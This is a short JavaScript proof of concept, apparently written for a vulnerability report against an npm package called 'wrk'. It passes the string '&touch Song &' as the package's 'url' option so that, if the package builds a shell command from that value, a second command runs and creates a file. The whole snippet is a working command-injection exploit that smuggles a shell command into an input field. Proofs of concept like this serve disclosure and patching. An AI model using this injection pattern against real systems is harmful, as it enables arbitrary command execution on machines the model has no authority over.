var root = require("wrk");
var attack_code = "&touch Song &";
var opt = {
  'url': attack_code,
  'path': './'
}
root(opt, function(){});
